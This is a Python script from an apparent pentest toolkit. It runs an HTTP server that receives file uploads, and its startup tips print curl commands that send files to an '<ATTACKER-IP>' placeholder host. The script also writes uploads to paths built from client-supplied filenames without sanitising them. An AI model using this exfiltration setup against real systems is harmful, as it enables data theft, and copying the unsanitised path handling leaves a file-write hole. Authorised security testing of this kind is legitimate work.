# https://github.com/manesec/tools4mane
# write by @manesec.

# Reference : https://stackoverflow.com/questions/46332093/how-to-get-data-from-fieldstorage

import http.server, socketserver
import io, cgi ,os
import argparse

print("""
 ▄▀▀▄ ▄▀▄  ▄▀▀█▄   ▄▀▀▄ ▀▄  ▄▀▀█▄▄▄▄  ▄▀▀▀▀▄  ▄▀▀█▄▄▄▄  ▄▀▄▄▄▄  
█  █ ▀  █ ▐ ▄▀ ▀▄ █  █ █ █ ▐  ▄▀   ▐ █ █   ▐ ▐  ▄▀   ▐ █ █    ▌ 
▐  █    █   █▄▄▄█ ▐  █  ▀█   █▄▄▄▄▄     ▀▄     █▄▄▄▄▄  ▐ █      
  █    █   ▄▀   █   █   █    █    ▌  ▀▄   █    █    ▌    █      
▄▀   ▄▀   █   ▄▀  ▄▀   █    ▄▀▄▄▄▄    █▀▀▀    ▄▀▄▄▄▄    ▄▀▄▄▄▄▀ 
█    █    ▐   ▐   █    ▐    █    ▐    ▐       █    ▐   █     ▐  
▐    ▐            ▐         ▐                 ▐        ▐        
    Simple File Receiver via http post - Tools4me by @manesec.
                    Version: 20221008
            https://github.com/manesec/tools4mane
---------------------------------------------------------------""")

parser = argparse.ArgumentParser(description='Simple File Receiver via http post.',\
    formatter_class=argparse.RawDescriptionHelpFormatter,\
    epilog="""\
Example:
  
  # Start server ...
  SimpleFileReceiver.py

  # force rename start with 'file'
  SimpleFileReceiver.py -r file

""")

parser.add_argument('-l',"--listen",type=str, default="0.0.0.0", help="Listen interface, default is 0.0.0.0")
parser.add_argument('-p',"--port",type=int, default=8080, help="Listen port, default is 8080")
parser.add_argument('-d',"--directory",type=str, default=".", help="Save file directory.")
parser.add_argument('-f',"--formstr",type=str, default="<any>", help="Post from str, like: form['file']")
parser.add_argument('-r',"--rename",type=str, default="<none>", help="Rename the file start with str.")

args = parser.parse_args()

rename_index = 0

if not (os.path.exists(args.directory)):
    print("[*] Making %s directory ..." % (args.directory))
    from pathlib import Path
    path = Path(args.directory)
    path.mkdir(parents=True, exist_ok=True)

class CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
    def do_POST(self):     
        print("[*] Receiving post requests by %s:%s ..." % (self.client_address[0],self.client_address[1]))

        return_status = self.deal_post_data()

        f = io.BytesIO()
        if return_status:
            f.write(b"success to upload \n")
        else:
            f.write(b"server error\n")

        length = f.tell()
        f.seek(0)
        self.send_response(200)
        self.send_header("Content-type", "text/plain")
        self.send_header("Content-Length", str(length))
        self.end_headers()
        if f:
            self.copyfile(f, self.wfile)
            f.close()      

    def deal_post_data(self):
        global rename_index
        ctype, pdict = cgi.parse_header(self.headers['Content-Type'])
        pdict['boundary'] = bytes(pdict['boundary'], "utf-8")
        pdict['CONTENT-LENGTH'] = int(self.headers['Content-Length'])
        if ctype == 'multipart/form-data':
            
            form = cgi.FieldStorage( fp=self.rfile, headers=self.headers, environ={'REQUEST_METHOD':'POST', 'CONTENT_TYPE':self.headers['Content-Type'], })

            post_str = ""
            save_path = ""

            if (args.formstr == "<any>"):
                post_str = form.keys()[0]
            elif (form.keys()[0] != args.formstr):
                print("[!] Rejection request, cause %s != %s." % (form.keys()[0] , args.formstr))
                return False

            post_str = form.keys()[0]
            try:
                if isinstance(form[post_str], list):
                    for record in form[post_str]:
                        if (args.rename == "<none>"):
                            save_path = os.path.abspath(os.getcwd() + "/" + args.directory + "/" + record.filename)
                        else:
                            save_path = os.getcwd() + "/" + args.directory + "/" + "%s-%s" % (args.rename,rename_index)
                            rename_index += 1
                        save_path = os.path.abspath(save_path)

                        print("[*] Receiving %s ..." % (record.filename))
                        open(save_path, "wb").write(record.file.read())
                        print("[!] Saved %s to %s." % (record.filename,save_path))
                else:

                    if (args.rename == "<none>"):
                        save_path = os.path.abspath(os.getcwd() + "/" + args.directory + "/" + form[post_str].filename)
                    else:
                        save_path = os.getcwd() + "/" + args.directory + "/" + "%s-%s" % (args.rename,rename_index)
                        rename_index += 1
                    save_path = os.path.abspath(save_path)

                    print("[*] Receiving %s ..." % (form[post_str].filename))
                    open(save_path, "wb").write(form[post_str].file.read())
                    print("[!] Saved %s into %s" % (form[post_str].filename,save_path))

            except IOError:
                    print("[ERR] Can't create file to write, do you have permission to write?")
                    return False
        
        return True

Handler = CustomHTTPRequestHandler
with socketserver.TCPServer((args.listen, args.port), Handler) as httpd:
    showserver = "<ATTACKER-IP>"
    if not (args.listen == "0.0.0.0"):
        showserver = args.listen

    print(f"""Tips: Upload file command like :
    curl -F '{args.formstr}=@<FILENAME>' http://{showserver}:{args.port}/
    curl -F '{args.formstr}=@<FILE1>' -F '{args.formstr}=@<FILE2>' http://{showserver}:{args.port}/
    """)

    print("[*] Starting SimpleFileReceiver in %s:%s ..." % (args.listen,args.port))

    httpd.serve_forever()